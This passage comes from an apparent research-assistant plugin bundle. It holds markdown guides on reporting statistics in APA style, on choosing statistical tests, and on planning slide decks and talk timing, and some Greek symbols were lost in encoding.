for all variables) were handled using listwise deletion. Outliers beyond 3 SD from the mean were winsorized. For the primary ANOVA, partial eta-squared (_p) is reported as the effect size measure. Post hoc comparisons used Tukey's HSD to control family-wise error rate.\"\n\n---\n\n## Results Section\n\n### Descriptive Statistics\n\n**What to report**:\n- Sample size (for each group if applicable)\n- Measures of central tendency (M, Mdn)\n- Measures of variability (SD, IQR, range)\n- Confidence intervals (when appropriate)\n\n**Example (continuous outcome)**:\n> \"Group A (n = 48) had a mean score of 75.2 (SD = 8.5, 95% CI [72.7, 77.7]), while Group B (n = 52) scored 68.3 (SD = 9.2, 95% CI [65.7, 70.9]).\"\n\n**Example (categorical outcome)**:\n> \"Of the 145 participants, 89 (61.4%) chose Option A, 42 (29.0%) chose Option B, and 14 (9.7%) chose Option C.\"\n\n**Tables for descriptive statistics**:\n- Use tables for multiple variables or groups\n- Include M, SD, and n (minimum)\n- Can include range, skewness, kurtosis if relevant\n\n---\n\n### Assumption Checks\n\n**What to report**:\n- Which assumptions were tested\n- Results of diagnostic tests\n- Whether assumptions were met\n- Actions taken if violated\n\n**Example**:\n> \"Normality was assessed using Shapiro-Wilk tests. Data for Group A (W = 0.97, p = .18) and Group B (W = 0.96, p = .12) did not significantly deviate from normality. Levene's test indicated homogeneity of variance, F(1, 98) = 1.23, p = .27. Therefore, assumptions for the independent samples t-test were satisfied.\"\n\n**Example (violated)**:\n> \"Shapiro-Wilk tests indicated significant departure from normality for Group C (W = 0.89, p = .003). Therefore, the non-parametric Mann-Whitney U test was used instead of the independent samples t-test.\"\n\n---\n\n### Inferential Statistics\n\n#### T-Tests\n\n**What to report**:\n- Test statistic (t)\n- Degrees of freedom\n- p-value (exact if p > .001, otherwise p < .001)\n- Effect size (Cohen's d or Hedges' g) with CI\n- Direction of effect\n- Whether test was one- or two-tailed\n\n**Format**: t(df) = value, p = value, d = value, 95% CI [lower, upper]\n\n**Example (independent t-test)**:\n> \"Group A (M = 75.2, SD = 8.5) scored significantly higher than Group B (M = 68.3, SD = 9.2), t(98) = 3.82, p < .001, d = 0.77, 95% CI [0.36, 1.18], two-tailed.\"\n\n**Example (paired t-test)**:\n> \"Scores increased significantly from pretest (M = 65.4, SD = 10.2) to posttest (M = 71.8, SD = 9.7), t(49) = 4.21, p < .001, d = 0.64, 95% CI [0.33, 0.95].\"\n\n**Example (Welch's t-test)**:\n> \"Due to unequal variances, Welch's t-test was used. Group A scored significantly higher than Group B, t(94.3) = 3.65, p < .001, d = 0.74.\"\n\n**Example (non-significant)**:\n> \"There was no significant difference between Group A (M = 72.1, SD = 8.3) and Group B (M = 70.5, SD = 8.9), t(98) = 0.91, p = .36, d = 0.18, 95% CI [-0.21, 0.57].\"\n\n---\n\n#### ANOVA\n\n**What to report**:\n- F statistic\n- Degrees of freedom (effect, error)\n- p-value\n- Effect size (, _p, or )\n- Means and SDs for all groups\n- Post hoc test results (if significant)\n\n**Format**: F(df_effect, df_error) = value, p = value, _p = value\n\n**Example (one-way ANOVA)**:\n> \"There was a significant main effect of treatment condition on test scores, F(2, 147) = 8.45, p < .001, _p = .10. Post hoc comparisons using Tukey's HSD revealed that Condition A (M = 78.2, SD = 7.3) scored significantly higher than Condition B (M = 71.5, SD = 8.1, p = .002, d = 0.87) and Condition C (M = 70.1, SD = 7.9, p < .001, d = 1.07). Conditions B and C did not differ significantly (p = .52, d = 0.18).\"\n\n**Example (factorial ANOVA)**:\n> \"A 2 (feedback: positive vs. negative)  2 (timing: immediate vs. delayed) between-subjects ANOVA revealed a significant main effect of feedback, F(1, 146) = 12.34, p < .001, _p = .08, but no significant main effect of timing, F(1, 146) = 2.10, p = .15, _p = .01. Critically, the interaction was significant, F(1, 146) = 6.78, p = .01, _p = .04. Simple effects analysis showed that positive feedback improved performance for immediate timing (M_diff = 8.2, p < .001) but not for delayed timing (M_diff = 1.3, p = .42).\"\n\n**Example (repeated measures ANOVA)**:\n> \"A one-way repeated measures ANOVA revealed a significant effect of time point on anxiety scores, F(2, 98) = 15.67, p < .001, _p = .24. Mauchly's test indicated that the assumption of sphericity was violated, (2) = 8.45, p = .01, therefore Greenhouse-Geisser corrected values are reported ( = 0.87). Pairwise comparisons with Bonferroni correction showed...\"\n\n---\n\n#### Correlation\n\n**What to report**:\n- Correlation coefficient (r or )\n- Sample size\n- p-value\n- Direction and strength\n- Confidence interval\n- Coefficient of determination (r) if relevant\n\n**Format**: r(df) = value, p = value, 95% CI [lower, upper]\n\n**Example (Pearson)**:\n> \"There was a moderate positive correlation between study time and exam score, r(148) = .42, p < .001, 95% CI [.27, .55], indicating that 18% of the variance in exam scores was shared with study time (r = .18).\"\n\n**Example (Spearman)**:\n> \"A Spearman rank-order correlation revealed a significant positive association between class rank and motivation, (118) = .38, p < .001, 95% CI [.21, .52].\"\n\n**Example (non-significant)**:\n> \"There was no significant correlation between age and reaction time, r(98) = -.12, p = .23, 95% CI [-.31, .08].\"\n\n---\n\n#### Regression\n\n**What to report**:\n- Overall model fit (R, adjusted R, F-test)\n- Coefficients (B, SE, , t, p) for each predictor\n- Effect sizes\n- Confidence intervals for coefficients\n- Variance inflation factors (if multicollinearity assessed)\n\n**Format**: B = value, SE = value,  = value, t = value, p = value, 95% CI [lower, upper]\n\n**Example (simple regression)**:\n> \"Simple linear regression showed that study hours significantly predicted exam scores, F(1, 148) = 42.5, p < .001, R = .22. Specifically, each additional hour of study was associated with a 2.4-point increase in exam score (B = 2.40, SE = 0.37,  = .47, t = 6.52, p < .001, 95% CI [1.67, 3.13]).\"\n\n**Example (multiple regression)**:\n> \"Multiple linear regression was conducted to predict exam scores from study hours, prior GPA, and attendance. The overall model was significant, F(3, 146) = 45.2, p < .001, R = .48, adjusted R = .47. Study hours (B = 1.80, SE = 0.31,  = .35, t = 5.78, p < .001, 95% CI [1.18, 2.42]) and prior GPA (B = 8.52, SE = 1.95,  = .28, t = 4.37, p < .001, 95% CI [4.66, 12.38]) were significant predictors, but attendance was not (B = 0.15, SE = 0.12,  = .08, t = 1.25, p = .21, 95% CI [-0.09, 0.39]). Multicollinearity was not a concern, as all VIF values were below 1.5.\"\n\n**Example (logistic regression)**:\n> \"Logistic regression was conducted to predict pass/fail status from study hours. The overall model was significant, (1) = 28.7, p < .001, Nagelkerke R = .31. Each additional study hour increased the odds of passing by 1.35 times (OR = 1.35, 95% CI [1.18, 1.54], p < .001). The model correctly classified 76% of cases (sensitivity = 81%, specificity = 68%).\"\n\n---\n\n#### Chi-Square Tests\n\n**What to report**:\n-  statistic\n- Degrees of freedom\n- p-value\n- Effect size (Cramr's V or )\n- Observed and expected frequencies (or percentages)\n\n**Format**: (df, N = total) = value, p = value, Cramr's V = value\n\n**Example (22)**:\n> \"A chi-square test of independence revealed a significant association between treatment group and outcome, (1, N = 150) = 8.45, p = .004,  = .24. Specifically, 72% of participants in the treatment group improved compared to 48% in the control group.\"\n\n**Example (larger table)**:\n> \"A chi-square test examined the relationship between education level (high school, bachelor's, graduate) and political affiliation (liberal, moderate, conservative). The association was significant, (4, N = 300) = 18.7, p = .001, Cramr's V = .18, indicating a small to moderate association.\"\n\n**Example (Fisher's exact)**:\n> \"Due to expected cell counts below 5, Fisher's exact test was used. The association between treatment and outcome was significant, p = .018 (two-tailed), OR = 3.42, 95% CI [1.21, 9.64].\"\n\n---\n\n#### Non-Parametric Tests\n\n**Mann-Whitney U**:\n> \"A Mann-Whitney U test indicated that Group A (Mdn = 75, IQR = 10) had significantly higher scores than Group B (Mdn = 68, IQR = 12), U = 845, z = 3.21, p = .001, r = .32.\"\n\n**Wilcoxon signed-rank**:\n> \"A Wilcoxon signed-rank test showed that scores increased significantly from pretest (Mdn = 65, IQR = 15) to posttest (Mdn = 72, IQR = 14), z = 3.89, p < .001, r = .39.\"\n\n**Kruskal-Wallis**:\n> \"A Kruskal-Wallis test revealed significant differences among the three conditions, H(2) = 15.7, p < .001,  = .09. Follow-up pairwise comparisons with Bonferroni correction showed...\"\n\n---\n\n#### Bayesian Statistics\n\n**What to report**:\n- Prior distributions used\n- Posterior estimates (mean/median, credible intervals)\n- Bayes Factor (if hypothesis testing)\n- Convergence diagnostics (R-hat, ESS)\n- Posterior predictive checks\n\n**Example (Bayesian t-test)**:\n> \"A Bayesian independent samples t-test was conducted using weakly informative priors (Normal(0, 1) for mean difference). The posterior distribution of the mean difference had a mean of 6.8 (95% credible interval [3.2, 10.4]), indicating that Group A scored higher than Group B. The Bayes Factor BF = 45.3 provided very strong evidence for a difference between groups. There was a 99.8% posterior probability that Group A's mean exceeded Group B's mean.\"\n\n**Example (Bayesian regression)**:\n> \"A Bayesian linear regression was fitted with weakly informative priors (Normal(0, 10) for coefficients, Half-Cauchy(0, 5) for residual SD). The model showed that study hours credibly predicted exam scores ( = 0.52, 95% CI [0.38, 0.66]; 0 not included in interval). All convergence diagnostics were satisfactory (R-hat < 1.01, ESS > 1000 for all parameters). Posterior predictive checks indicated adequate model fit.\"\n\n---\n\n## Effect Sizes\n\n### Always Report\n\n**Why**:\n- p-values don't indicate magnitude\n- Required by APA and most journals\n- Essential for meta-analysis\n- Informs practical significance\n\n**Which effect size?**\n- T-tests: Cohen's d or Hedges' g\n- ANOVA: , _p, or \n- Correlation: r (already is an effect size)\n- Regression:  (standardized), R, f\n- Chi-square: Cramr's V or \n\n**With confidence intervals**:\n- Always report CIs for effect sizes when possible\n- Shows precision of estimate\n- More informative than point estimate alone\n\n---\n\n## Figures and Tables\n\n### When to Use Tables vs. Figures\n\n**Tables**:\n- Exact values needed\n- Many variables/conditions\n- Descriptive statistics\n- Regression coefficients\n- Correlation matrices\n\n**Figures**:\n- Patterns and trends\n- Distributions\n- Interactions\n- Comparisons across groups\n- Time series\n\n### Figure Guidelines\n\n**General**:\n- Clear, readable labels\n- Sufficient font size ( 10pt)\n- High resolution ( 300 dpi for publications)\n- Monochrome-friendly (colorblind-accessible)\n- Error bars (SE or 95% CI; specify which!)\n- Legend when needed\n\n**Common figure types**:\n- Bar charts: Group comparisons (include error bars)\n- Box plots: Distributions, outliers\n- Scatter plots: Correlations, relationships\n- Line graphs: Change over time, interactions\n- Violin plots: Distributions (better than box plots)\n\n**Example figure caption**:\n> \"Figure 1. Mean exam scores by study condition. Error bars represent 95% confidence intervals. * p < .05, ** p < .01, *** p < .001.\"\n\n### Table Guidelines\n\n**General**:\n- Clear column and row labels\n- Consistent decimal places (usually 2)\n- Horizontal lines only (not vertical)\n- Notes below table for clarifications\n- Statistical symbols in italics (p, M, SD, F, t, r)\n\n**Example table**:\n\n**Table 1**\n*Descriptive Statistics and Intercorrelations*\n\n| Variable | M | SD | 1 | 2 | 3 |\n|----------|---|----|----|----|----|\n| 1. Study hours | 5.2 | 2.1 |  | | |\n| 2. Prior GPA | 3.1 | 0.5 | .42** |  | |\n| 3. Exam score | 75.3 | 10.2 | .47*** | .52*** |  |\n\n*Note*. N = 150. ** p < .01. *** p < .001.\n\n---\n\n## Common Mistakes to Avoid\n\n1. **Reporting p = .000**: Report p < .001 instead\n2. **Omitting effect sizes**: Always include them\n3. **Not reporting assumption checks**: Describe tests and outcomes\n4. **Confusing statistical and practical significance**: Discuss both\n5. **Only reporting significant results**: Report all planned analyses\n6. **Using \"prove\" or \"confirm\"**: Use \"support\" or \"consistent with\"\n7. **Saying \"marginally significant\" for .05 < p < .10**: Either significant or not\n8. **Reporting only one decimal for p-values**: Use two (p = .03, not p = .0)\n9. **Not specifying one- vs. two-tailed**: Always clarify\n10. **Inconsistent rounding**: Be consistent throughout\n\n---\n\n## Null Results\n\n### How to Report Non-Significant Findings\n\n**Don't say**:\n- \"There was no effect\"\n- \"X and Y are unrelated\"\n- \"Groups are equivalent\"\n\n**Do say**:\n- \"There was no significant difference\"\n- \"The effect was not statistically significant\"\n- \"We did not find evidence for a relationship\"\n\n**Include**:\n- Exact p-value (not just \"ns\" or \"p > .05\")\n- Effect size (shows magnitude even if not significant)\n- Confidence interval (may include meaningful values)\n- Power analysis (was study adequately powered?)\n\n**Example**:\n> \"Contrary to our hypothesis, there was no significant difference in creativity scores between the music (M = 72.1, SD = 8.3) and silence (M = 70.5, SD = 8.9) conditions, t(98) = 0.91, p = .36, d = 0.18, 95% CI [-0.21, 0.57]. A post hoc sensitivity analysis revealed that the study had 80% power to detect an effect of d = 0.57 or larger, suggesting the null finding may reflect insufficient power to detect small effects.\"\n\n---\n\n## Reproducibility\n\n### Materials to Share\n\n1. **Data**: De-identified raw data (or aggregate if sensitive)\n2. **Code**: Analysis scripts\n3. **Materials**: Stimuli, measures, protocols\n4. **Supplements**: Additional analyses, tables\n\n**Where to share**:\n- Open Science Framework (OSF)\n- GitHub (for code)\n- Journal supplements\n- Institutional repository\n\n**In paper**:\n> \"Data, analysis code, and materials are available at https://osf.io/xxxxx/\"\n\n---\n\n## Checklist for Statistical Reporting\n\n- [ ] Sample size and demographics\n- [ ] Study design clearly described\n- [ ] All measures described with reliability\n- [ ] Procedure detailed\n- [ ] Software and versions specified\n- [ ] Alpha level stated\n- [ ] Assumption checks reported\n- [ ] Descriptive statistics (M, SD, n)\n- [ ] Test statistics with df and p-values\n- [ ] Effect sizes with confidence intervals\n- [ ] All planned analyses reported (including non-significant)\n- [ ] Figures/tables properly formatted and labeled\n- [ ] Multiple comparisons corrections described\n- [ ] Missing data handling explained\n- [ ] Limitations discussed\n- [ ] Data/code availability statement\n\n---\n\n## Additional Resources\n\n- APA Publication Manual (7th edition)\n- CONSORT guidelines (for RCTs)\n- STROBE guidelines (for observational studies)\n- PRISMA guidelines (for systematic reviews/meta-analyses)\n- Wilkinson & Task Force on Statistical Inference (1999). Statistical methods in psychology journals.\n",
        "plugins/sys-research/skills/analyzing-data/references/test_selection_guide.md": "# Statistical Test Selection Guide\n\nThis guide provides a decision tree for selecting appropriate statistical tests based on research questions, data types, and study designs.\n\n**Table of Contents**:\n- [1. Comparing Groups](#1-comparing-groups)\n- [2. Relationships Between Variables](#2-relationships-between-variables)\n- [3. Predictive Models](#3-predictive-models)\n- [4. Non-Parametric Alternatives](#4-non-parametric-alternatives)\n\n## Decision Tree for Test Selection\n\n### 1. Comparing Groups\n\n#### Two Independent Groups\n- **Continuous outcome, normally distributed**: Independent samples t-test\n- **Continuous outcome, non-normal**: Mann-Whitney U test (Wilcoxon rank-sum test)\n- **Binary outcome**: Chi-square test or Fisher's exact test (if expected counts < 5)\n- **Ordinal outcome**: Mann-Whitney U test\n\n#### Two Paired/Dependent Groups\n- **Continuous outcome, normally distributed**: Paired t-test\n- **Continuous outcome, non-normal**: Wilcoxon signed-rank test\n- **Binary outcome**: McNemar's test\n- **Ordinal outcome**: Wilcoxon signed-rank test\n\n#### Three or More Independent Groups\n- **Continuous outcome, normally distributed, equal variances**: One-way ANOVA\n- **Continuous outcome, normally distributed, unequal variances**: Welch's ANOVA\n- **Continuous outcome, non-normal**: Kruskal-Wallis H test\n- **Binary/categorical outcome**: Chi-square test\n- **Ordinal outcome**: Kruskal-Wallis H test\n\n#### Three or More Paired/Dependent Groups\n- **Continuous outcome, normally distributed**: Repeated measures ANOVA\n- **Continuous outcome, non-normal**: Friedman test\n- **Binary outcome**: Cochran's Q test\n\n#### Multiple Factors (Factorial Designs)\n- **Continuous outcome**: Two-way ANOVA (or higher-way ANOVA)\n- **With covariates**: ANCOVA\n- **Mixed within and between factors**: Mixed ANOVA\n\n### 2. Relationships Between Variables\n\n#### Two Continuous Variables\n- **Linear relationship, bivariate normal**: Pearson correlation\n- **Monotonic relationship or non-normal**: Spearman rank correlation\n- **Rank-based data**: Spearman or Kendall's tau\n\n#### One Continuous Outcome, One or More Predictors\n- **Single continuous predictor**: Simple linear regression\n- **Multiple continuous/categorical predictors**: Multiple linear regression\n- **Categorical predictors**: ANOVA/ANCOVA framework\n- **Non-linear relationships**: Polynomial regression or generalized additive models (GAM)\n\n#### Binary Outcome\n- **Single predictor**: Logistic regression\n- **Multiple predictors**: Multiple logistic regression\n- **Rare events**: Exact logistic regression or Firth's method\n\n#### Count Outcome\n- **Poisson-distributed**: Poisson regression\n- **Overdispersed counts**: Negative binomial regression\n- **Zero-inflated**: Zero-inflated Poisson/negative binomial\n\n#### Time-to-Event Outcome\n- **Comparing survival curves**: Log-rank test\n- **Modeling with covariates**: Cox proportional hazards regression\n- **Parametric survival models**: Weibull, exponential, log-normal\n\n### 3. Agreement and Reliability\n\n#### Inter-Rater Reliability\n- **Categorical ratings, 2 raters**: Cohen's kappa\n- **Categorical ratings, >2 raters**: Fleiss' kappa or Krippendorff's alpha\n- **Continuous ratings**: Intraclass correlation coefficient (ICC)\n\n#### Test-Retest Reliability\n- **Continuous measurements**: ICC or Pearson correlation\n- **Internal consistency**: Cronbach's alpha\n\n#### Agreement Between Methods\n- **Continuous measurements**: Bland-Altman analysis\n- **Categorical classifications**: Cohen's kappa\n\n### 4. Categorical Data Analysis\n\n#### Contingency Tables\n- **2x2 table**: Chi-square test or Fisher's exact test\n- **Larger than 2x2**: Chi-square test\n- **Ordered categories**: Cochran-Armitage trend test\n- **Paired categories**: McNemar's test (2x2) or McNemar-Bowker test (larger)\n\n### 5. Bayesian Alternatives\n\nAny of the above tests can be performed using Bayesian methods:\n- **Group comparisons**: Bayesian t-test, Bayesian ANOVA\n- **Correlations**: Bayesian correlation\n- **Regression**: Bayesian linear/logistic regression\n\n**Advantages of Bayesian approaches:**\n- Provides probability of hypotheses given data\n- Naturally incorporates prior information\n- Provides credible intervals instead of confidence intervals\n- No p-value interpretation issues\n\n## Key Considerations\n\n### Sample Size\n- Small samples (n < 30): Consider non-parametric tests or exact methods\n- Very large samples: Even small effects may be statistically significant; focus on effect sizes\n\n### Multiple Comparisons\n- When conducting multiple tests, adjust for multiple comparisons using:\n  - Bonferroni correction (conservative)\n  - Holm-Bonferroni (less conservative)\n  - False Discovery Rate (FDR) control (Benjamini-Hochberg)\n  - Tukey HSD for post-hoc ANOVA comparisons\n\n### Missing Data\n- Complete case analysis (listwise deletion)\n- Multiple imputation\n- Maximum likelihood methods\n- Ensure missing data mechanism is understood (MCAR, MAR, MNAR)\n\n### Effect Sizes\n- Always report effect sizes alongside p-values\n- See `effect_sizes_and_power.md` for guidance\n\n### Study Design Considerations\n- Randomized controlled trials: Standard parametric/non-parametric tests\n- Observational studies: Consider confounding and use regression/matching\n- Clustered/nested data: Use mixed-effects models or GEE\n- Time series: Use time series methods (ARIMA, etc.)\n",
        "plugins/sys-research/skills/architecting-slides/SKILL.md": "---\nname: architecting-slides\ndescription: \"Expertise in narrative structure, academic storytelling, and LaTeX Beamer presentations. Use when designing the flow of research talks and building technical slide decks with a focus on scientific rigor and narrative clarity.\"\nallowed-tools: [Read, Write, Edit, Bash]\n---\n\n# Architecting Slides Protocol\n\n## Overview\n\n\n\n## Quick Start\n\n```bash\n# Plan talk structure\n# (Narrative planning is the first step)\n\n# Choose a LaTeX template\n# assets/beamer_template_conference.tex\n\n# Integrate visuals from sys-multimodal\npython scripts/slides_to_pdf.py slides/*.png -o presentation.pdf\n```\n\n## Workflows\n\n### LaTeX Beamer (Default - Recommended)\n\n**Best for**: Mathematical content, consistent formatting, academic rigor.\n\n1. **Choose template** from `assets/` (e.g., `beamer_template_conference.tex`)\n2. **Customize theme** and colors\n3. **Add content** (equations, code, algorithms)\n4. **Narrative Review**: Ensure flow matches the story arc in `references/presentation_structure.md`\n5. **Compile** to PDF\n\nSee `references/beamer_workflow.md` for documentation.\n\n### Visual Presentations (Hybrid)\n\n**Best for**: Visually stunning results, fast creation.\n\n1. **Plan**: Create detailed narrative plan for each slide.\n2. **Generate**: Use `sys-multimodal` or `canvas-design` skills for visual assets.\n3. **Combine**: Assemble into PDF with `scripts/slides_to_pdf.py` (powered by `sys-multimodal` utilities).\n\n## Reference Library\n\n### Base Templates\n- **Structure**: [Presentation Structure](references/presentation_structure.md) - Story arcs, talk types, timing\n- **Design**: [Slide Design Principles](references/slide_design_principles.md) - Typography, color, layout, accessibility\n- **Visualization**: [Data Visualization](references/data_visualization_slides.md) - Chart types, simplification, recreation\n\n### Advanced Guides\n- **Talk Types**: [Talk Types Guide](references/talk_types_guide.md) - Conference, seminar, defense, grant, journal club specific guidance\n- **Beamer**: [Beamer Guide](references/beamer_guide.md) - LaTeX themes, customization, advanced features\n- **Visual Review**: [Visual Review Workflow](references/visual_review_workflow.md) - Validation, iteration, quality assurance\n\n\n\n",
        "plugins/sys-research/skills/architecting-slides/assets/timing_guidelines.md": "# Presentation Timing Guidelines\n\n## Overview\n\nProper timing is critical for professional scientific presentations. This guide provides detailed guidelines for slide counts, time allocation, pacing strategies, and practice techniques to ensure your presentation fits the allotted time while maintaining engagement and clarity.\n\n## The One-Slide-Per-Minute Rule\n\n### Basic Guideline\n\n**Rule of Thumb**: Plan for approximately 1 slide per minute of presentation time.\n\n**Why It Works**:\n- Allows adequate time to explain each concept\n- Accounts for transitions and questions\n- Provides buffer for variations in pace\n- Industry-standard baseline for planning\n\n**Adjustments**:\n- **Complex slides** (data-heavy, detailed figures): 2-3 minutes each\n- **Simple slides** (title, section dividers): 15-30 seconds each\n- **Key result slides**: 2-4 minutes each\n- **Build slides** (animations): Count as multiple slides\n\n### Slide Count by Talk Length\n\n| Duration | Total Slides | Title/Intro | Methods | Results | Discussion | Conclusion |\n|----------|--------------|-------------|---------|---------|------------|------------|\n| 5 min    | 5-7          | 1-2         | 0-1     | 2-3     | 1          | 1          |\n| 10 min   | 10-12        | 2           | 1-2     | 4-5     | 2-3        | 1          |\n| 15 min   | 15-18        | 2-3         | 2-3     | 6-8     | 3-4        | 1-2        |\n| 20 min   | 20-24        | 3           | 3-4     | 8-10    | 4-5        | 2          |\n| 30 min   | 25-30        | 3-4         | 5-6     | 10-12   | 6-8        | 2          |\n| 45 min   | 35-45        | 4-5         | 8-10    | 15-20   | 8-10       | 2-3        |\n| 60 min   | 45-60        | 5-6         | 10-12   | 20-25   | 10-12      | 3-4        |\n\n### Exceptions to the Rule\n\n**When to Use More Slides**:\n- Many simple concepts to cover\n- Highly visual presentation (minimal text)\n- Progressive builds (each build = new \"slide\")\n- Fast-paced overview talks\n\n**When to Use Fewer Slides**:\n- Deep dive into few concepts\n- Complex data visualizations\n- Interactive discussions expected\n- Technical/mathematical content\n\n## Time Allocation by Section\n\n### 15-Minute Conference Talk (Standard)\n\n**Total: 15 minutes, 15-18 slides**\n\n```\nIntroduction (2-3 minutes, 2-3 slides):\n Title slide: 30 seconds\n Hook/Background: 90 seconds\n Research question: 60 seconds\n\nMethods (2-3 minutes, 2-3 slides):\n Study design: 60-90 seconds\n Key procedures: 60 seconds\n Analysis: 30-60 seconds\n\nResults (6-7 minutes, 6-8 slides):\n Result 1: 2-3 minutes (2-3 slides)\n Result 2: 2 minutes (2 slides)\n Result 3: 2 minutes (2-3 slides)\n\nDiscussion (2-3 minutes, 3-4 slides):\n Interpretation: 60 seconds\n Prior work: 60 seconds\n Implications: 60 seconds\n\nConclusion (1 minute, 1-2 slides):\n Key takeaways: 45 seconds\n Acknowledgments: 15 seconds\n\nBuffer: 1-2 minutes for transitions and variation\n```\n\n**Key Principle**: Spend 40-50% of time on results.\n\n### 45-Minute Seminar\n\n**Total: 45 minutes, 35-45 slides**\n\n```\nIntroduction (8-10 minutes, 8-10 slides):\n Title and personal intro: 1 minute\n Big picture: 3-4 minutes\n Literature review: 3-4 minutes\n Research questions: 1-2 minutes\n Roadmap: 1 minute\n\nMethods (8-10 minutes, 8-10 slides):\n Design with rationale: 2-3 minutes\n Participants/materials: 2 minutes\n Procedures: 3-4 minutes\n Analysis approach: 2 minutes\n\nResults (18-22 minutes, 16-20 slides):\n Overview: 2 minutes\n Main finding 1: 6-8 minutes\n Main finding 2: 6-8 minutes\n Additional analyses: 4-6 minutes\n Summary: 1 minute\n\nDiscussion (10-12 minutes, 8-10 slides):\n Summary: 2 minutes\n Literature comparison: 3-4 minutes\n Mechanisms: 2-3 minutes\n Limitations: 2 minutes\n Implications: 2 minutes\n\nConclusion (2-3 minutes, 2-3 slides):\n Key messages: 1 minute\n Future directions: 1-2 minutes\n Acknowledgments: 30 seconds\n\nReserve: 5-10 minutes for Q&A or discussion\n```\n\n### Lightning Talk (5 Minutes)\n\n**Total: 5 minutes, 5-7 slides**\n\n```\nSlide 1: Title (15 seconds)\nSlide 2: The Problem (45 seconds)\nSlide 3: Your Solution (60 seconds)\nSlide 4-5: Key Result (2-3 minutes total)\nSlide 6: Impact/Implications (45 seconds)\nSlide 7: Conclusion + Contact (30 seconds)\n```\n\n**Critical**: Practice exact timing. No buffer room.\n\n## Timing Each Slide\n\n### Simple Slides\n\n**Title/Section Dividers** (15-30 seconds):\n- Say title\n- Brief transition comment\n- Move on quickly\n\n**Single Bullet Point Slides** (30-45 seconds):\n- Read or paraphrase point\n- Provide 1-2 sentences of explanation\n- Transition to next\n\n### Standard Content Slides\n\n**Bullet Point Slides** (1-2 minutes):\n- 3-4 bullets: ~1 minute\n- 5-6 bullets: ~2 minutes\n- **Strategy**:\n  - Don't read bullets verbatim\n  - Explain each point (15-20 seconds per bullet)\n  - Use builds to control pacing\n\n**Equation Slides** (1-2 minutes):\n- Introduce equation context (20 seconds)\n- Explain each term (40 seconds)\n- Discuss implications (20-40 seconds)\n\n### Complex Slides\n\n**Data Visualization Slides** (2-3 minutes):\n```\n30 seconds: Set up (what you're showing)\n60 seconds: Walk through key patterns\n30 seconds: Highlight main finding\n30 seconds: Statistical results\n30 seconds: Interpretation/transition\n```\n\n**Multi-Panel Figures** (2-4 minutes):\n```\nOption 1 - Progressive Build:\n- Show panel 1: 60 seconds\n- Add panel 2: 60 seconds  \n- Add panel 3: 60 seconds\n- Integrate: 60 seconds\n\nOption 2 - All at Once:\n- Overview: 30 seconds\n- Panel 1: 60 seconds\n- Panel 2: 60 seconds\n- Panel 3: 60 seconds\n- Integration: 30 seconds\n```\n\n**Table Slides** (1-2 minutes):\n- Don't read every cell\n- Guide attention: \"Notice the top row...\"\n- Highlight key comparison\n- State statistical result\n\n## Pacing Strategies\n\n### Maintaining Steady Pace\n\n**Natural Checkpoints** (Use these to self-monitor):\n\nFor 15-minute talk:\n- **3-4 minutes**: Should be finishing introduction\n- **7-8 minutes**: Should be halfway through results\n- **12-13 minutes**: Should be starting conclusions\n\nFor 45-minute talk:\n- **10 minutes**: Finishing introduction\n- **20 minutes**: Halfway through methods\n- **35 minutes**: Finishing results\n- **40 minutes**: In discussion\n\n### Signs You're Running Behind\n\n- Rushing through slides\n- Skipping explanations\n- Feeling time pressure\n- Glancing at clock frequently\n- Audience looking confused\n\n**Recovery Strategies**:\n1. Skip backup/secondary slides (prepare these in advance)\n2. Summarize instead of detailing\n3. Cut discussion, not results\n4. NEVER skip conclusions\n\n### Signs You're Ahead of Schedule\n\n- Finishing slides too quickly\n- Running out of things to say\n- Awkward pauses\n- Reaching conclusion with time left\n\n**Adjustment Strategies**:\n1. Expand on key points naturally\n2. Provide additional examples\n3. Take questions mid-talk (if appropriate)\n4. Slow down slightly (don't add filler)\n\n## Practice Techniques\n\n### Practice Schedule\n\n**Minimum Practice Requirements**:\n\n| Talk Type | Practice Runs | Time Commitment |\n|-----------|--------------|-----------------|\n| Lightning (5 min) | 5-7 times | 3 hours |\n| Conference (15 min) | 3-5 times | 4-5 hours |\n| Seminar (45 min) | 3-4 times | 6-8 hours |\n| Defense (60 min) | 4-6 times | 10-15 hours |\n\n### Practice Progression\n\n**Run 1: Rough Draft**\n- Focus: Get through all slides\n- Time it (will likely run long)\n- Identify problem areas\n- Note where you stumble\n\n**Run 2: Smoothing**\n- Focus: Improve transitions\n- Practice specific wording\n- Time each section\n- Start cutting if over time\n\n**Run 3: Refinement**\n- Focus: Exact timing\n- Practice with timer visible\n- Implement timing strategies\n- Fine-tune explanations\n\n**Run 4: Final Polish**\n- Focus: Delivery quality\n- Record yourself (video)\n- Practice Q&A scenarios\n- Perfect timing\n\n**Run 5+: Maintenance**\n- Day before talk\n- Morning of talk (if time)\n- Just opening and closing\n\n### Practice Methods\n\n**Solo Practice**:\n```\n1. Full talk with timer\n2. Section-by-section focus\n3. Speak aloud (not mental review)\n4. Stand and use gestures\n5. Simulate presentation environment\n```\n\n**Recorded Practice**:\n```\n1. Video yourself\n2. Watch playback critically\n3. Note:\n   - Timing issues\n   - Filler words (\"um\", \"uh\", \"like\")\n   - Body language\n   - Pace variations\n4. Re-record after improvements\n```\n\n**Live Audience Practice**:\n```\n1. Lab meeting or colleagues\n2. Request honest feedback\n3. Take questions\n4. Time strictly\n5. Note:\n   - Confusing sections\n   - Questions asked\n   - Engagement level\n```\n\n### Timing Tools\n\n**During Practice**:\n- Phone timer (visible)\n- Stopwatch with lap times\n- Timer app with alerts\n- Record for later analysis\n\n**During Presentation**:\n- Phone/watch timer (subtle glances)\n- Session clock (if provided)\n- Time notes on slides (bottom corner)\n- Vibrating watch alerts at key checkpoints\n\n**Timing Notes on Slides**:\n```\nAdd small text (8pt, corner):\nSlide 1: \"0:00\"\nSlide 5: \"3:30\"\nSlide 10: \"7:00\"\nSlide 15: \"12:00\"\nSlide 18: \"14:00\"\n```\n\n## Handling Time Constraints\n\n### If Time is Cut Short\n\n**Scenario**: \"We're running behind, can you cut to 10 minutes?\"\n\n**Strategy**:\n1. Keep introduction (brief)\n2. Mention methods (30 seconds)\n3. Show main result only (3 minutes)\n4. Brief conclusion (30 seconds)\n5. Skip: Secondary results, detailed discussion\n\n**Pre-Prepare**:\n- Know which slides are \"must keep\"\n- Mark \"optional\" slides\n- Have 5, 10, and 15-minute versions ready\n\n### If Given Extra Time\n\n**Scenario**: \"Previous speaker cancelled, you have 30 minutes instead of 15\"\n\n**Options**:\n1. Go deeper on key results\n2. Show backup slides\n3. Include additional analyses\n4. Extend discussion\n5. Allow more Q&A 